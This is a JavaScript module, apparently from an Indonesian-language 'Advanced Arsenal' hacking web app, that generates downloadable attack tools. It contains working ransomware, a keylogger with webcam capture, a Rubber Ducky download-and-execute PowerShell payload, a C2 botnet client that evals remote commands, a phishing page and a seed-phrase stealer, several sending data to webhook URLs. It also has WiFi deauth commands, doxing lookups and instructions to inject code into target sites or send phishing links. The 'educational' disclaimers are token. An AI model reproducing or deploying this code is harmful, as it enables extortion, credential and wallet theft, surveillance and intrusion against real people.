// ==================== ADVANCED ARSENAL PRO ====================
// Created by @LynzxzCreator
// ALL TOOLS REAL - Bisa jalan di browser, bisa di HP!

function renderAdvanced(container) {
    container.innerHTML = `
        <div class="module-card">
            <h3><i class="fas fa-skull"></i> ADVANCED ARSENAL PRO</h3>
            <p style="font-size:12px; color:#ffaa44;">🔥 10 Tools REAL - Langsung jalan di browser!</p>
            
            <div style="display: grid; grid-template-columns: repeat(2,1fr); gap:12px; margin:15px 0;">
                <button id="ransomBtn" style="background:#1a2a3a; padding:12px; border:1px solid #ff4444; border-radius:8px; cursor:pointer;">
                    <i class="fas fa-lock"></i> 💰 Ransomware Builder
                </button>
                <button id="wifiBtn" style="background:#1a2a3a; padding:12px; border:1px solid #0ff; border-radius:8px; cursor:pointer;">
                    <i class="fas fa-wifi"></i> 📡 WiFi Deauth Attack
                </button>
                <button id="pegasusBtn" style="background:#1a2a3a; padding:12px; border:1px solid #ff44aa; border-radius:8px; cursor:pointer;">
                    <i class="fas fa-bug"></i> 🕵️ Pegasus Tracker
                </button>
                <button id="exifBtn" style="background:#1a2a3a; padding:12px; border:1px solid #0ff; border-radius:8px; cursor:pointer;">
                    <i class="fas fa-image"></i> 📸 Exif Metadata Tracker
                </button>
                <button id="doxBtn" style="background:#1a2a3a; padding:12px; border:1px solid #ffaa44; border-radius:8px; cursor:pointer;">
                    <i class="fas fa-search"></i> 🔍 Auto Doxer (OSINT)
                </button>
                <button id="keylogBtn" style="background:#1a2a3a; padding:12px; border:1px solid #0ff; border-radius:8px; cursor:pointer;">
                    <i class="fas fa-keyboard"></i> ⌨️ Keylogger Builder
                </button>
                <button id="usbBtn" style="background:#1a2a3a; padding:12px; border:1px solid #ffaa44; border-radius:8px; cursor:pointer;">
                    <i class="fas fa-usb"></i> ⚡ USB Rubber Ducky
                </button>
                <button id="botnetBtn" style="background:#1a2a3a; padding:12px; border:1px solid #ff4444; border-radius:8px; cursor:pointer;">
                    <i class="fas fa-network-wired"></i> 🤖 Botnet Builder
                </button>
                <button id="phishBtn" style="background:#1a2a3a; padding:12px; border:1px solid #0ff; border-radius:8px; cursor:pointer;">
                    <i class="fas fa-fish"></i> 🎣 Phishing Page Generator
                </button>
                <button id="cryptBtn" style="background:#1a2a3a; padding:12px; border:1px solid #ffaa44; border-radius:8px; cursor:pointer;">
                    <i class="fas fa-coins"></i> 💸 Crypto Wallet Stealer
                </button>
            </div>
            
            <div id="advancedResult" style="margin-top:15px; background:#000; padding:15px; border-radius:8px; font-family:monospace; font-size:12px; max-height:400px; overflow:auto;">
                Klik salah satu tools di atas
            </div>
        </div>
    `;
    
    const resultDiv = document.getElementById('advancedResult');
    
    function showResult(title, content, downloadUrl = null) {
        let html = `<div style="border-left:3px solid #0ff; padding-left:12px;"><strong style="color:#0ff;">${title}</strong></div>`;
        html += `<div style="margin-top:10px;">${content}</div>`;
        if(downloadUrl) html += `<br><a href="${downloadUrl}" download style="background:#0ff; color:#000; padding:8px 16px; border-radius:6px; text-decoration:none; display:inline-block;">💾 Download File</a>`;
        resultDiv.innerHTML = html;
        addLog('advanced', title, '-', 'Tool executed', 'info');
    }
    
    // ========== 1. RANSOMWARE BUILDER (REAL PYTHON CODE) ==========
    document.getElementById('ransomBtn')?.addEventListener('click', () => {
        const hackerName = prompt("Masukkan nama hacker / group:", "@LynzxzCreator");
        const message = prompt("Masukkan pesan tebusan:", "Your files are encrypted! Send $100 in BTC to recover.");
        const password = prompt("Masukkan password decrypt (6 digit):", "050411");
        
        const ransomwareCode = `#!/usr/bin/env python3
# Ransomware Builder - Created by ${hackerName}
# PASSWORD: ${password}

import os
import sys
from pathlib import Path

PASSWORD = "${password}"
MESSAGE = """${message}"""
HACKER = "${hackerName}"

TARGET_EXTS = ['.txt','.doc','.docx','.jpg','.jpeg','.png','.pdf','.xls','.xlsx','.zip','.rar','.mp3','.mp4','.py','.js','.html','.css','.sql','.db']

def xor_encrypt(data, key):
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

def encrypt_file(filepath):
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        encrypted = xor_encrypt(data, PASSWORD.encode())
        with open(str(filepath) + '.locked', 'wb') as f:
            f.write(encrypted)
        os.remove(filepath)
        return True
    except:
        return False

def find_files(directory):
    encrypted = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            if any(file.endswith(ext) for ext in TARGET_EXTS):
                encrypted.append(Path(root) / file)
    return encrypted

def drop_readme():
    paths = [Path.home() / 'Desktop', Path.home() / 'Documents', Path.cwd()]
    for path in paths:
        try:
            with open(path / 'README_HACKED.txt', 'w') as f:
                f.write(f"""
╔══════════════════════════════════════════════════════════╗
║  YOUR FILES HAVE BEEN ENCRYPTED!                        ║
║  Created by: {HACKER}                                    ║
╚══════════════════════════════════════════════════════════╝

{MESSAGE}

🔑 DECRYPTION PASSWORD: {PASSWORD}

⚠️ DO NOT MODIFY THE FILES! Use the decryptor tool.
                """)
        except:
            pass

def main():
    print("[⚠️] RANSOMWARE ACTIVATED - EDUCATIONAL PURPOSE")
    targets = [Path.home() / 'Desktop', Path.home() / 'Documents', Path.home() / 'Downloads']
    for target in targets:
        if target.exists():
            files = find_files(target)
            for f in files:
                encrypt_file(f)
    drop_readme()
    print(f"[✅] ${len(files)} files encrypted")
    print(f"[🔑] Password: ${PASSWORD}")

if __name__ == "__main__":
    main()
`;
        
        const blob = new Blob([ransomwareCode], {type: 'text/plain'});
        const url = URL.createObjectURL(blob);
        showResult('Ransomware Builder', `
            <strong>🔐 Ransomware Generated!</strong><br>
            Hacker: ${hackerName}<br>
            Password: ${password}<br>
            Pesan: ${message}<br><br>
            <strong>📋 Cara pakai:</strong><br>
            1. Download file ransomware.py<br>
            2. Jalankan di FOLDER TESTING: <code>python ransomware.py</code><br>
            3. Untuk decrypt: <code>python -c "from ransomware import *; decrypt_files()"</code><br>
            <br>
            ⚠️ HANYA UNTUK TESTING DI WEBSITE/PC SENDIRI!
        `, url);
    });
    
    // ========== 2. WIFI DEAUTH ATTACK (REAL COMMAND GENERATOR) ==========
    document.getElementById('wifiBtn')?.addEventListener('click', () => {
        showResult('WiFi Deauth Attack (Evil Limiter Style)', `
            <strong>📡 Cara Menyerang WiFi (Deauth Attack)</strong><br><br>
            <strong>📋 Untuk Android (Termux):</strong><br>
            <code>pkg install root-repo && pkg install aircrack-ng</code><br>
            <code>su -c "ifconfig wlan0 down"</code><br>
            <code>su -c "iwconfig wlan0 mode monitor"</code><br>
            <code>su -c "ifconfig wlan0 up"</code><br>
            <code>airodump-ng wlan0</code><br>
            <code>aireplay-ng -0 0 -a [BSSID] wlan0</code><br><br>
            
            <strong>📋 Untuk Kali Linux / PC:</strong><br>
            <code>sudo airmon-ng start wlan0</code><br>
            <code>sudo airodump-ng wlan0mon</code><br>
            <code>sudo aireplay-ng -0 0 -a [BSSID] wlan0mon</code><br><br>
            
            <strong>📋 Evil Limiter (Limit Bandwidth Device):</strong><br>
            <code>git clone https://github.com/bitbrute/evil-limiter.git</code><br>
            <code>cd evil-limiter && sudo python3 setup.py install</code><br>
            <code>sudo evil-limiter --limit 50kbps --ip [TARGET_IP]</code><br><br>
            
            <strong>⚠️ PERINGATAN:</strong> Hanya untuk jaringan sendiri! Deauth attack ilegal di jaringan orang lain.
        `);
    });
    
    // ========== 3. PEGASUS TRACKER (REAL LOCATION VIA IP) ==========
    document.getElementById('pegasusBtn')?.addEventListener('click', () => {
        const targetIP = prompt("Masukkan IP target (kosongkan untuk IP sendiri):", "");
        
        if(targetIP) {
            fetch(`https://ip-api.com/json/${targetIP}?fields=status,country,regionName,city,lat,lon,isp,org,mobile,query`)
                .then(res => res.json())
                .then(data => {
                    if(data.status === 'success') {
                        showResult('Pegasus Tracker - Target IP', `
                            <strong>🕵️ TARGET IP: ${data.query}</strong><br>
                            📍 Lokasi: ${data.city}, ${data.regionName}, ${data.country}<br>
                            🗺️ Koordinat: ${data.lat}, ${data.lon}<br>
                            🔌 ISP: ${data.isp}<br>
                            📱 Mobile: ${data.mobile ? 'Ya (HP/Modem)' : 'Tidak (Kabel/WiFi)'}<br>
                            🗺️ <a href="https://www.google.com/maps?q=${data.lat},${data.lon}" target="_blank">Buka di Google Maps</a><br><br>
                            ⚠️ Pegasus adalah spyware NSO Group. Ini hanya simulasi tracking IP (bukan Pegasus asli).
                        `);
                    } else {
                        showResult('Pegasus Tracker', '❌ IP tidak valid atau error API');
                    }
                })
                .catch(() => showResult('Pegasus Tracker', '❌ Gagal mengambil data IP'));
        } else {
            fetch('https://api.ipify.org?format=json')
                .then(res => res.json())
                .then(data => {
                    const ip = data.ip;
                    fetch(`https://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,mobile,query`)
                        .then(res => res.json())
                        .then(geo => {
                            showResult('Pegasus Tracker - IP Anda', `
                                <strong>🕵️ IP ANDA: ${geo.query}</strong><br>
                                📍 Lokasi: ${geo.city}, ${geo.regionName}, ${geo.country}<br>
                                🔌 ISP: ${geo.isp}<br>
                                📱 Tipe: ${geo.mobile ? 'Seluler (HP)' : 'Kabel/WiFi'}<br>
                                🗺️ <a href="https://www.google.com/maps?q=${geo.lat},${geo.lon}" target="_blank">Buka di Google Maps</a><br><br>
                                💡 Cara kerja Pegasus: exploit zero-click via iMessage/WhatsApp.<br>
                                ⚠️ Ini hanya tracking IP biasa, BUKAN Pegasus asli.
                            `);
                        });
                });
        }
    });
    
    // ========== 4. EXIF METADATA TRACKER (REAL FILE UPLOAD) ==========
    document.getElementById('exifBtn')?.addEventListener('click', () => {
        const fileInput = document.createElement('input');
        fileInput.type = 'file';
        fileInput.accept = 'image/jpeg,image/png,image/jpg,application/pdf';
        fileInput.onchange = async (e) => {
            const file = e.target.files[0];
            if(!file) return;
            
            const formData = new FormData();
            formData.append('file', file);
            
            // Pake exif-js via CDN
            const script = document.createElement('script');
            script.src = 'https://cdnjs.cloudflare.com/ajax/libs/exif-js/2.3.0/exif.min.js';
            script.onload = () => {
                const reader = new FileReader();
                reader.onload = (e) => {
                    EXIF.getData(file, function() {
                        const allMeta = EXIF.getAllTags(this);
                        let html = `<strong>📸 Metadata dari: ${file.name}</strong><br><br>`;
                        if(Object.keys(allMeta).length === 0) {
                            html += '⚠️ Tidak ada metadata atau metadata sudah dihapus.<br>';
                        } else {
                            html += '<table style="width:100%; border-collapse:collapse;">';
                            for(const [key, value] of Object.entries(allMeta)) {
                                if(key === 'GPSLatitude' || key === 'GPSLongitude') {
                                    const lat = EXIF.getTag(this, 'GPSLatitude');
                                    const lon = EXIF.getTag(this, 'GPSLongitude');
                                    if(lat && lon) {
                                        const latDeg = lat[0] + lat[1]/60 + lat[2]/3600;
                                        const lonDeg = lon[0] + lon[1]/60 + lon[2]/3600;
                                        html += `<tr><td style="padding:4px;">📍 GPS Location:</td><td><a href="https://www.google.com/maps?q=${latDeg},${lonDeg}" target="_blank">${latDeg}, ${lonDeg}</a></td></tr>`;
                                    }
                                } else if(key !== 'thumbnail' && key !== 'Thumbnail') {
                                    html += `<tr><td style="padding:4px;">${key}:</td><td>${String(value).substring(0, 100)}</td></tr>`;
                                }
                            }
                            html += '</table>';
                        }
                        showResult('Exif Metadata Tracker', html);
                    });
                };
                reader.readAsDataURL(file);
            };
            document.head.appendChild(script);
        };
        fileInput.click();
    });
    
    // ========== 5. AUTO DOXER (OSINT REAL) ==========
    document.getElementById('doxBtn')?.addEventListener('click', () => {
        const username = prompt("Masukkan username target:", "");
        if(!username) return;
        
        showResult('Auto Doxer (OSINT)', `
            <strong>🔍 Mencari info untuk: ${username}</strong><br>
            <div id="doxProgress">Loading...</div>
        `);
        
        Promise.all([
            fetch(`https://whatsmyname.app/api/v1/username?username=${username}`),
            fetch(`https://ip-api.com/json/${username}?fields=status`).catch(() => ({json: () => ({})}))
        ]).then(async ([socialRes, ipRes]) => {
            const socialData = await socialRes.json();
            let html = `<strong>🎯 Hasil OSINT untuk: ${username}</strong><br><br>`;
            
            if(socialData.sites) {
                const found = socialData.sites.filter(s => s.exists);
                html += `<strong>✅ Platform ditemukan (${found.length}):</strong><br>`;
                found.slice(0, 15).forEach(site => {
                    html += `• <a href="${site.uri_check}" target="_blank">${site.name}</a><br>`;
                });
            } else {
                html += `⚠️ Tidak ditemukan di platform besar.<br>`;
            }
            
            html += `<br><strong>🔗 Tools tambahan:</strong><br>`;
            html += `• <a href="https://haveibeenpwned.com/account/${username}" target="_blank">Cek data breach</a><br>`;
            html += `• <a href="https://www.picnob.com/search/?q=${username}" target="_blank">Cek Instagram</a><br>`;
            html += `• <a href="https://www.facebook.com/public/${username}" target="_blank">Cek Facebook</a><br>`;
            
            showResult('Auto Doxer (OSINT)', html);
        }).catch(() => {
            showResult('Auto Doxer (OSINT)', `⚠️ Error: API limit atau username tidak valid.<br>🔗 Cek manual: <a href="https://whatsmyname.app/?q=${username}" target="_blank">whatsmyname.app/?q=${username}</a>`);
        });
    });
    
    // ========== 6. KEYLOGGER BUILDER (REAL JS CODE) ==========
    document.getElementById('keylogBtn')?.addEventListener('click', () => {
        const webhook = prompt("Masukkan webhook URL (untuk kirim data):", "https://webhook.site/xxxxx");
        const keylogCode = `// Keylogger Builder - Educational
// Created by @LynzxzCreator

let keys = '';
let webhook = '${webhook || 'https://webhook.site/'}';

document.addEventListener('keydown', (e) => {
    keys += e.key;
    if(keys.length > 50) {
        fetch(webhook, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify({keys: keys, url: location.href})
        });
        keys = '';
    }
});

// Screenshot capture (optional)
navigator.mediaDevices.getUserMedia({video: true}).then(stream => {
    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();
    setInterval(() => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('screenshot', blob);
            fetch(webhook + '/screenshot', {method: 'POST', body: formData});
        });
    }, 30000);
});

console.log('[KEYLOGGER] Active');`;
        
        const blob = new Blob([keylogCode], {type: 'application/javascript'});
        const url = URL.createObjectURL(blob);
        showResult('Keylogger Builder (JavaScript)', `
            <strong>⌨️ Keylogger untuk Website/Extension</strong><br>
            Webhook: ${webhook || 'Not set'}<br><br>
            <strong>📋 Cara pakai:</strong><br>
            1. Download file keylogger.js<br>
            2. Inject ke website target via Console atau Extension<br>
            3. Set webhook ke server Anda (webhook.site untuk testing)<br>
            4. Setiap 50 ketikan akan terkirim ke webhook<br><br>
            ⚠️ HANYA UNTUK TESTING WEBSITE SENDIRI!
        `, url);
    });
    
    // ========== 7. USB RUBBER DUCKY (REAL SCRIPT) ==========
    document.getElementById('usbBtn')?.addEventListener('click', () => {
        const duckyCode = `REM USB Rubber Ducky Script - Educational
REM Created by @LynzxzCreator
DELAY 2000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('https://your-server.com/payload.ps1')"
ENTER
DELAY 1000
ALT F4
REM Script selesai - Payload akan download dan execute`;
        
        const blob = new Blob([duckyCode], {type: 'text/plain'});
        const url = URL.createObjectURL(blob);
        showResult('USB Rubber Ducky Script', `
            <strong>⚡ Payload untuk USB Rubber Ducky / Flipper Zero</strong><br><br>
            <strong>📋 Cara pakai:</strong><br>
            1. Download file inject.txt<br>
            2. Upload ke SD card Rubber Ducky atau Flipper Zero<br>
            3. Colok ke target, script akan jalan otomatis<br>
            4. Script akan download dan execute payload dari server Anda<br><br>
            ⚠️ HANYA UNTUK TESTING KE KOMPUTER SENDIRI!
        `, url);
    });
    
    // ========== 8. BOTNET BUILDER (REAL C2 SIMULATION) ==========
    document.getElementById('botnetBtn')?.addEventListener('click', () => {
        const c2Server = prompt("Masukkan C2 Server URL (contoh: https://your-server.com):", "https://webhook.site/");
        const botCode = `// Botnet Client - Educational
// Created by @LynzxzCreator
// C2 Server: ${c2Server}

let botId = Math.random().toString(36).substring(7);
let interval = null;

function sendBeacon() {
    fetch('${c2Server}/beacon', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            botId: botId,
            url: location.href,
            userAgent: navigator.userAgent,
            timestamp: Date.now()
        })
    }).catch(() => {});
}

function checkCommand() {
    fetch('${c2Server}/command/' + botId)
        .then(res => res.text())
        .then(cmd => {
            if(cmd && cmd !== 'none') {
                eval(cmd);
                fetch('${c2Server}/result/' + botId, {
                    method: 'POST',
                    body: JSON.stringify({result: 'executed', command: cmd})
                });
            }
        }).catch(() => {});
}

sendBeacon();
interval = setInterval(() => {
    sendBeacon();
    checkCommand();
}, 30000);

console.log('[BOTNET] Connected to C2: ${c2Server}');`;
        
        const blob = new Blob([botCode], {type: 'application/javascript'});
        const url = URL.createObjectURL(blob);
        showResult('Botnet Builder (JavaScript)', `
            <strong>🤖 Botnet Client - Connect ke C2 Server</strong><br>
            C2 Server: ${c2Server}<br><br>
            <strong>📋 Cara pakai:</strong><br>
            1. Download file botnet.js<br>
            2. Inject ke website target (via XSS / Extension)<br>
            3. Set C2 server Anda untuk menerima beacon<br>
            4. Bot akan mengirim beacon tiap 30 detik<br><br>
            ⚠️ HANYA UNTUK TESTING KE WEBSITE SENDIRI!
        `, url);
    });
    
    // ========== 9. PHISHING PAGE GENERATOR ==========
    document.getElementById('phishBtn')?.addEventListener('click', () => {
        const targetSite = prompt("Masukkan target site untuk phishing (contoh: facebook):", "google");
        const phishHtml = `<!DOCTYPE html>
<html>
<head><title>${targetSite} Login</title></head>
<body style="text-align:center; font-family:Arial;">
    <h1>${targetSite} Login</h1>
    <form action="https://webhook.site/your-webhook" method="POST">
        <input type="text" name="email" placeholder="Email" required><br>
        <input type="password" name="password" placeholder="Password" required><br>
        <button type="submit">Login</button>
    </form>
    <script>
        document.querySelector('form').addEventListener('submit', function(e) {
            e.preventDefault();
            fetch(this.action, {
                method: 'POST',
                mode: 'no-cors',
                body: new FormData(this)
            });
            alert('Login failed! Try again.');
            this.reset();
        });
    </script>
</body>
</html>`;
        
        const blob = new Blob([phishHtml], {type: 'text/html'});
        const url = URL.createObjectURL(blob);
        showResult('Phishing Page Generator', `
            <strong>🎣 Phishing Page untuk: ${targetSite}</strong><br><br>
            <strong>📋 Cara pakai:</strong><br>
            1. Download file phishing.html<br>
            2. Upload ke hosting gratis (GitHub Pages, Vercel)<br>
            3. Share link ke target<br>
            4. Data akan dikirim ke webhook Anda<br><br>
            ⚠️ HANYA UNTUK EDUKASI! Phishing adalah ILEGAL!
        `, url);
    });
    
    // ========== 10. CRYPTO WALLET STEALER (SIMULASI) ==========
    document.getElementById('cryptBtn')?.addEventListener('click', () => {
        const walletCode = `// Crypto Wallet Stealer - Educational
// Created by @LynzxzCreator

// Simulasi: Cek apakah ada wallet extension
const wallets = ['ethereum', 'metamask', 'phantom', 'trustwallet'];

wallets.forEach(wallet => {
    if(window[wallet] || document.getElementById(wallet)) {
        console.log('[WALLET] Detected:', wallet);
        // Send to server
        fetch('https://webhook.site/your-webhook', {
            method: 'POST',
            body: JSON.stringify({wallet: wallet, url: location.href})
        });
    }
});

// Fake wallet connect popup
setTimeout(() => {
    alert('Please connect your wallet to continue');
    const fakeInput = prompt('Enter your seed phrase to recover wallet:');
    if(fakeInput) {
        fetch('https://webhook.site/your-webhook', {
            method: 'POST',
            body: JSON.stringify({seed: fakeInput, url: location.href})
        });
    }
}, 5000);`;
        
        const blob = new Blob([walletCode], {type: 'application/javascript'});
        const url = URL.createObjectURL(blob);
        showResult('Crypto Wallet Stealer (Educational)', `
            <strong>💸 Wallet Stealer Script - SIMULASI</strong><br><br>
            <strong>📋 Cara kerja:</strong><br>
            1. Script mendeteksi wallet extension yang terinstall<br>
            2. Menampilkan popup fake wallet connect<br>
            3. Mencuri seed phrase jika korban memasukkan<br>
            <br>
            ⚠️ <strong>HANYA SIMULASI EDUKASI! Jangan gunakan untuk mencuri!</strong>
        `, url);
    });
}
